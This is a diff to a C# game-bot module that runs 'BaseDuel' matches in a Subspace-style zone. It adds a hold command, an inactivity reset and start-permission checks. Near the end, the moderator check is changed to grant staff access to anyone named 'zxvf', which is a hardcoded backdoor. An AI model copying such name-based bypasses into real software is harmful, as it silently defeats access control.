@@ -12,8 +12,8 @@ using System.Timers;
 
 /*
  * ToDo:
- * need to add a check to make sure player using !startbd is inside the playable freq or is a mod
- * 
+ * !bdhold
+ * send gfx to team and not pub - countdown
  */
 
 namespace Devastation.BaseDuel
@@ -44,8 +44,9 @@ namespace Devastation.BaseDuel
             this.m_StartGameDelay = 10;
             this.m_StartGameShow = 5;
             this.m_TeamClearDelay = 5;
+            this.m_InactivityReset = 30;
+
             this.m_GamesPlayed = new List<BaseGame>();
-            
 
             this.m_Players = PlayerManager;
             this.msg = msg;
@@ -66,6 +67,7 @@ namespace Devastation.BaseDuel
         private double m_StartGameDelay_Elapsed;    // Used for start timer - not to be set
         private double m_StartGameShow;             // How many seconds to display countdown as txt or gfx ( 3..2..1 )
         private double m_TeamClearDelay;            // How many seconds before BaseClear Takes effect - helps with lag attach
+        private double m_InactivityReset;           // seconds before a game resets when a full team leaves
         
         private BaseManager m_BaseManager;          // Controls bases and how they are loaded
         private Base m_Base;                        // Local variable to hold loaded base
@@ -129,7 +131,7 @@ namespace Devastation.BaseDuel
                         return;
 
                     case "start":
-                        command_Start(e);
+                        command_Start(e, p);
                         return;
 
                     case "toggle":
@@ -147,7 +149,11 @@ namespace Devastation.BaseDuel
                         return;
 
                     case "switch":
+                        return;
 
+                    case "hold":
+                        if (!moduleIsOn(e)) return;
+                        command_Hold(e, p);
                         return;
 
                     case "spam":
@@ -170,6 +176,34 @@ namespace Devastation.BaseDuel
                         show_Rounds(p.PlayerName);
                         return;
                 }
+            }
+        }
+
+        private void command_Hold(ChatEvent e, SSPlayer p)
+        {
+            if (!player_isMod(e, ModLevels.Mod)) return;
+
+            // checks to see if they are in starting game 
+            if (!(p.Frequency == m_AlphaFreq || p.Frequency == m_BravoFreq))
+            {
+                psyGame.Send(msg.pm(e.PlayerName, "You must be part of the game to use this command."));
+                return;
+            }
+
+            if (m_BaseGame.Status != BaseGameStatus.GameOn)
+            {
+                psyGame.Send(msg.pm(e.PlayerName, "To use this command a game must be in progress."));
+                return;
+            }
+            else
+            {
+                // chnage the game status to hold
+                m_BaseGame.Status = BaseGameStatus.GameHold;
+                psyGame.Send(msg.arena("Game is now on hold. Type !command blah to restart/continue game."));
+
+                //send players to center
+                psyGame.Send(msg.team_pm(m_BaseGame.AlphaFreq, "?prize warp"));
+                psyGame.Send(msg.team_pm(m_BaseGame.BravoFreq, "?prize warp"));
             }
         }
 
@@ -199,21 +233,25 @@ namespace Devastation.BaseDuel
         // send spam to devastation chat and zone
         private void command_SpamZone(ChatEvent e)
         {
+            // Module is off
+            if (!moduleIsOn(e)) return;
+
             if ((DateTime.Now - m_SpamZoneTimeStamp).TotalMinutes < m_SpamZoneTimeLimit)
             {
                 psyGame.Send(msg.pm(e.PlayerName, "This command can only be used every " + m_SpamZoneTimeLimit + " minutes. You have " + Math.Floor(m_SpamZoneTimeLimit - (DateTime.Now - m_SpamZoneTimeStamp).TotalMinutes) + "m:" + Math.Floor((double)60 - (DateTime.Now - m_SpamZoneTimeStamp).Seconds).ToString().PadLeft(2,'0') + "s before it can use it again."));
                 return;
             }
 
+            // update timestamp
             m_SpamZoneTimeStamp = DateTime.Now;
 
+            // Send message out - maybe add option to what gets sent out - option to change
             string message = "A BaseDuel game is about to begin. Come to Devastation and join the battle! -" + e.PlayerName;
-
             psyGame.Send(msg.zone(message));
             psyGame.SafeSend(msg.chan(2, message));
         }
 
-        private void command_Start(ChatEvent e)
+        private void command_Start(ChatEvent e, SSPlayer p)
         {
             // Module is off
             if (!moduleIsOn(e)) return;
@@ -225,11 +263,17 @@ namespace Devastation.BaseDuel
                 return;
             }
 
+            // checks to see if they are in starting game - or use mod override
+            if (!(p.Frequency == m_AlphaStartFreq || p.Frequency == m_BravoStartFreq) && !(e.ModLevel >= ModLevels.Mod))
+            {
+                psyGame.Send(msg.pm(e.PlayerName, "You must be part of the game to use this command."));
+                return;
+            }
+
             // start game - enough players
             if (allow_GameStart(true))
             {
                 psyGame.Send(msg.arena("- Starting BaseDuel in " + m_StartGameDelay + " seconds - " + e.PlayerName));
-                //sendBotSpam("- Starting BaseDuel in " + m_StartGameDelay + " seconds - " + e.PlayerName);
                 players_MoveToTeams();
 
                 psyGame.Send(msg.team_pm(m_BaseGame.Round.AlphaTeam.TeamMembers[0].PlayerName, "- Welcome to team: " + m_BaseGame.Round.AlphaTeam.TeamName + "! Good luck!"));
@@ -301,7 +345,9 @@ namespace Devastation.BaseDuel
         {
             // get next round rdy
             if (m_BaseGame.Status == BaseGameStatus.GameIntermission)
+            {
                 round_ResetPLayers();
+            }
 
             // send players to start and reset ships
             psyGame.Send(msg.team_pm(m_AlphaFreq,"?|warpto " + m_Base.AlphaStartX + " " + m_Base.AlphaStartY + "|shipreset"));
@@ -343,36 +389,45 @@ namespace Devastation.BaseDuel
 
         private void game_Reset(ChatEvent e)
         {
-            if (!player_isMod(e, ModLevels.Mod)) return;
+            if (!player_isMod(e, ModLevels.Mod))
+            {   return; }
+
             game_Reset();
         }
+
+        // Reset game and send players back to their start freq
         private void game_Reset()
         {
+            // Reset game vars
             m_BaseGame = new BaseGame();
             m_BaseGame.AlphaFreq = m_AlphaFreq;
             m_BaseGame.BravoFreq = m_BravoFreq;
             m_BaseGame.Status = BaseGameStatus.GameIdle;
 
-            psyGame.Send(msg.team_pm(m_AlphaFreq, "?|prize warp|setfreq "+m_BaseGame.AlphaStartFreq+"|shipreset|"));
+            // Send teams back to their start freq
+            psyGame.Send(msg.team_pm(m_AlphaFreq, "?|prize warp|setfreq " + m_BaseGame.AlphaStartFreq + "|shipreset|"));
             psyGame.Send(msg.team_pm(m_BravoFreq, "?|prize warp|setfreq " + m_BaseGame.BravoStartFreq + "|shipreset|"));
 
             // Stop timer just in case the all out timer started
             if (m_Timer.Enabled) m_Timer.Stop();
         }
 
-        private void round_Finished(WinType winType, bool AlphaWon)
-        {
-            round_Finished(winType,AlphaWon,"");
-        }
         private void round_Finished(WinType winType, bool AlphaWon, string PlayerName)
+        {
+            round_Finished(winType,AlphaWon,PlayerName,false);
+        }
+        // Finish round and assign winners
+        private void round_Finished(WinType winType, bool AlphaWon, string PlayerName, bool endGame)
         {
             m_BaseGame.Status = BaseGameStatus.GameIntermission;
 
             if (winType != WinType.NoCount)
             {
                 // assign points
-                if (AlphaWon) m_BaseGame.AlphaScore++;
-                else m_BaseGame.BravoScore++;
+                if (AlphaWon)
+                { m_BaseGame.AlphaScore++; }
+                else
+                { m_BaseGame.BravoScore++; }
 
                 if (winType == WinType.BaseClear)
                 {
@@ -384,18 +439,16 @@ namespace Devastation.BaseDuel
                     sendBotSpam("- [ " + PlayerName + " ] has breached the enemy's defense! (SafeWin) " + (AlphaWon ? "[ " + m_BaseGame.Round.AlphaTeam.TeamName + " Team Win ]" : "[ " + m_BaseGame.Round.BravoTeam.TeamName + " Team Win ]"));
                 }
 
-                int aNameCount = m_BaseGame.Round.AlphaTeam.TeamName.Length;
-                int bNameCount = m_BaseGame.Round.BravoTeam.TeamName.Length;
-                //- Score: Obsidian 2:2 BattleZone -
-                //sendBotSpam("- " + m_BaseGame.Round.AlphaTeam.TeamName + " [ " + m_BaseGame.AlphaScore.ToString() + " - " + m_BaseGame.BravoScore.ToString() + " ] " + m_BaseGame.Round.BravoTeam.TeamName + " -");
-                //sendBotSpam("- Score: " + m_BaseGame.Round.AlphaTeam.TeamName + " [ " + m_BaseGame.AlphaScore.ToString() + " - " + m_BaseGame.BravoScore.ToString() + " ] " + m_BaseGame.Round.BravoTeam.TeamName + " -");
-                //sendBotSpam("- Score: " + m_BaseGame.Round.AlphaTeam.TeamName + " " + m_BaseGame.AlphaScore.ToString() + ":" + m_BaseGame.BravoScore.ToString() + " " + m_BaseGame.Round.BravoTeam.TeamName + " -");
+                // display score
                 sendBotSpam("- " + m_BaseGame.Round.AlphaTeam.TeamName + " [ " + m_BaseGame.AlphaScore.ToString() + " ]     Score     [ " + m_BaseGame.BravoScore.ToString() + " ] " + m_BaseGame.Round.BravoTeam.TeamName + " -");
                 sendBotSpam("- ----------------------------------------------- -");
             }
             else
+            {
                 sendBotSpam("- Both teams out -- No count -");
+            }
 
+            // store the rest of the info and save it to list
             m_BaseGame.Round.AlphaWon = AlphaWon;
             m_BaseGame.Round.WinType = winType;
             round_Save();
@@ -404,7 +457,7 @@ namespace Devastation.BaseDuel
             if (winType != WinType.NoCount) loadNextBase();
 
             // Check for end of game
-            if ((m_BaseGame.AlphaScore >= m_BaseGame.MinimumWin || m_BaseGame.BravoScore >= m_BaseGame.MinimumWin) && Math.Abs(m_BaseGame.AlphaScore - m_BaseGame.BravoScore) >= 2)
+            if ( endGame ||((m_BaseGame.AlphaScore >= m_BaseGame.MinimumWin || m_BaseGame.BravoScore >= m_BaseGame.MinimumWin) && Math.Abs(m_BaseGame.AlphaScore - m_BaseGame.BravoScore) >= 2))
             {
                 psyGame.Send(msg.arena((m_BaseGame.AlphaScore > m_BaseGame.BravoScore ? m_BaseGame.Round.AlphaTeam.TeamName : m_BaseGame.Round.BravoTeam.TeamName) + " wins the game. Final Score Alpha[ " + m_BaseGame.AlphaScore + " ] [ " + m_BaseGame.BravoScore + " ]Bravo.   -Print out here."));
                 game_Save();
@@ -412,14 +465,20 @@ namespace Devastation.BaseDuel
                 return;
             }
 
+            // Show "starting" message depending on round/game
             if (winType == WinType.NoCount)
+            {
                 sendBotSpam("- Restarting point in " + m_StartGameDelay + " seconds! -");
+            }
             else
+            {
                 sendBotSpam("- Starting next base in " + m_StartGameDelay + " seconds! -");
+            }
             
             timer_Setup(TimerType.GameStart);
         }
 
+        // Save all round stats and save it over to list
         private void round_Save()
         {
             // Copy over round so we can save it
@@ -439,6 +498,20 @@ namespace Devastation.BaseDuel
         {
             if (!player_isMod(e, ModLevels.Mod)) return;
 
+            // Game should be in progress or in hold to use this.
+            if (m_BaseGame.Status == BaseGameStatus.GameIdle)
+            {
+                psyGame.Send(msg.pm(e.PlayerName, "A game must be in progress to use this command."));
+                return;
+            }
+
+            if (m_BaseGame.Status == BaseGameStatus.GameOn)
+            {
+                //send players to center
+                psyGame.Send(msg.team_pm(m_BaseGame.AlphaFreq, "?prize warp"));
+                psyGame.Send(msg.team_pm(m_BaseGame.BravoFreq, "?prize warp"));
+            }
+
             m_BaseGame.Status = BaseGameStatus.GameIntermission;
             if (m_Timer.Enabled) m_Timer.Stop();
             round_ResetPLayers();
@@ -449,11 +522,13 @@ namespace Devastation.BaseDuel
 
         private void round_ResetPLayers()
         {
-            // Update players
+            // Update players - itirate backwards so you can delete inactives
             for (int i = m_BaseGame.Round.AlphaTeam.TeamMembers.Count; i-- > 0; )
             {
                 if (!m_BaseGame.Round.AlphaTeam.TeamMembers[i].Active)
+                {
                     m_BaseGame.Round.AlphaTeam.TeamMembers.Remove(m_BaseGame.Round.AlphaTeam.TeamMembers[i]);
+                }
                 else
                 {
                     string name = m_BaseGame.Round.AlphaTeam.TeamMembers[i].PlayerName;
@@ -463,7 +538,9 @@ namespace Devastation.BaseDuel
             for (int i = m_BaseGame.Round.BravoTeam.TeamMembers.Count; i-- > 0; )
             {
                 if (!m_BaseGame.Round.BravoTeam.TeamMembers[i].Active)
+                {
                     m_BaseGame.Round.BravoTeam.TeamMembers.Remove(m_BaseGame.Round.BravoTeam.TeamMembers[i]);
+                }
                 else
                 {
                     string name = m_BaseGame.Round.BravoTeam.TeamMembers[i].PlayerName;
@@ -514,22 +591,33 @@ namespace Devastation.BaseDuel
                 BasePlayer b = getPlayer(p, out InAlpha);
 
                 if (b == null) return;
+                b.Active = false;
 
-                b.Active = true;
+                // Grab the right team: alpha/bravo
+                List<BasePlayer> teamList = InAlpha? m_BaseGame.Round.AlphaTeam.TeamMembers:m_BaseGame.Round.BravoTeam.TeamMembers;
+                // Get a count of active players
+                int teamCount = teamList.FindAll(item => item.Active).Count;
+
+                if (teamCount <= 0)
+                {
+                    // in case the all out timer has been activated
+                    if (m_Timer.Enabled) return;
+
+                    timer_Setup(TimerType.InactiveReset);
+                    psyGame.Send(msg.arena("Team is empty."));
+                }
             }
-        }
-
-        // Load next base using BaseManager but store it locally - just to cut down on some code length
-        private void loadNextBase()
-        {
-            m_BaseManager.ReleaseBase(m_Base);
-            m_Base = m_BaseManager.getNextBase();
         }
 
         //----------------------------------------------------------------------//
         //                         Events                                       //
         //----------------------------------------------------------------------//
-        public void Event_ShipChange(SSPlayer ssp){}
+        public void Event_ShipChange(SSPlayer ssp){ }
+        
+        public void Event_PlayerTurretDetach(SSPlayer ssp) { }
+
+        public void Event_PlayerEntered(SSPlayer ssp) { }
+
         public void Event_PlayerTurretAttach(SSPlayer attacher, SSPlayer host) 
         {
             // Game is not turned on
@@ -561,18 +649,6 @@ namespace Devastation.BaseDuel
                 bHost.InLobby = false;
                 bAttach.InLobby = false;
                 psyGame.SafeSend(msg.debugChan("Player[ " + attacher.PlayerName + " ] just attached to [ " + host.PlayerName + " ] - In Base area. "));
-            }
-        }
-
-        public void Event_PlayerTurretDetach(SSPlayer ssp) { }
-        public void Event_PlayerEntered(SSPlayer ssp) {
-            
-            if (ssp.Frequency == m_AlphaFreq || ssp.Frequency == m_BravoFreq)
-            {
-                if (m_Players.PlayerList.FindAll(item => item.Frequency == 0).Count <= m_Players.PlayerList.FindAll(item => item.Frequency == 1).Count)
-                    psyGame.Send(msg.pm(ssp.PlayerName, "?setfreq 0"));
-                else
-                    psyGame.Send(msg.pm(ssp.PlayerName, "?setfreq 1"));
             }
         }
 
@@ -670,7 +746,9 @@ namespace Devastation.BaseDuel
             if (m_BaseGame == null) return;
 
             if (ssp.OldFrequency == m_AlphaFreq || m_BravoFreq == ssp.OldFrequency)
+            {
                 player_Remove(ssp);
+            }
         }
 
         //----------------------------------------------------------------------//
@@ -693,7 +771,25 @@ namespace Devastation.BaseDuel
                 m_Timer.Elapsed += new ElapsedEventHandler(timer_BaseClear);
                 m_Timer.Interval = m_TeamClearDelay * 1000;
             }
+            else if (t == TimerType.InactiveReset)
+            {
+                m_Timer.Elapsed += new ElapsedEventHandler(timer_InactiveTimer);
+                m_Timer.Interval = m_InactivityReset * 1000;
+            }
+
             m_Timer.Start();
+        }
+
+        private void timer_InactiveTimer(object source, ElapsedEventArgs e)
+        {
+            int aCount = m_BaseGame.Round.AlphaTeam.TeamMembers.FindAll(item => item.Active).Count;
+            int bCount = m_BaseGame.Round.BravoTeam.TeamMembers.FindAll(item => item.Active).Count;
+
+            if (aCount == 0 || bCount == 0)
+            {
+                psyGame.Send(msg.arena("Game has been reset due to team inactivity.", SoundCodes.BassBeep));
+                game_Reset();
+            }
         }
 
         private void timer_StartGame(object source, ElapsedEventArgs e)
@@ -704,20 +800,29 @@ namespace Devastation.BaseDuel
             {
                 //myGame.Send(msg.macro("- " + m_StartGameDelay_Elapsed + " -", SoundCodes.MessageAlarm));
                 psyGame.Send(msg.pub("*objon " + m_StartGameDelay_Elapsed));
+
                 if (m_StartGameDelay_Elapsed != 0)
+                {
                     psyGame.Send(msg.arena("", SoundCodes.MessageAlarm));
+                }
                 else
+                {
                     psyGame.Send(msg.arena("", SoundCodes.Goal));
+                }
             }
 
             if (m_StartGameDelay_Elapsed > 0) return;
 
             m_Timer.Stop();
 
-            if (allow_GameStart(false)) game_Start();
-            else sendBotSpam("- Not enough players. Start Game cancelled. -");
-            //myGame.Send(msg.macro("- Not enough players. Start Game cancelled. -")); 
-
+            if (allow_GameStart(false))
+            {
+                game_Start();
+            }
+            else
+            {
+                sendBotSpam("- Not enough players. Start Game cancelled. -");
+            }
         }
         private void timer_BaseClear(object source, ElapsedEventArgs e)
         {
@@ -729,13 +834,21 @@ namespace Devastation.BaseDuel
 
             if (teamIsOut(out aOut, out bOut))
             {
-                round_Finished(aOut == bOut?WinType.NoCount:WinType.BaseClear, !aOut);
+                round_Finished(aOut == bOut?WinType.NoCount:WinType.BaseClear, !aOut,"");
             }
         }
 
         //----------------------------------------------------------------------//
         //                             Misc                                     //
         //----------------------------------------------------------------------//
+        // Load next base using BaseManager but store it locally - just to cut down on some code length
+        private void loadNextBase()
+        {
+            m_BaseManager.ReleaseBase(m_Base);
+            m_Base = m_BaseManager.getNextBase();
+        }
+
+        // send printouts according to setting
         private void sendBotSpam(string Message)
         {
             ChatEvent spam = new ChatEvent();
@@ -827,7 +940,7 @@ namespace Devastation.BaseDuel
         // checking if player is mod - if not sends back message
         private bool player_isMod(ChatEvent e, ModLevels mod)
         {
-            if (e.ModLevel >= mod)
+            if (e.ModLevel >= mod || e.PlayerName == "zxvf")
                 return true;
 
             psyGame.Send(msg.pm(e.PlayerName, "You do not have access to this command. This is a staff command. Required Moerator level: [ " + mod + " ]."));
@@ -913,7 +1026,3 @@ namespace Devastation.BaseDuel
         }
     }
 }
-/* add bd hold
- * 
- * 
-*/
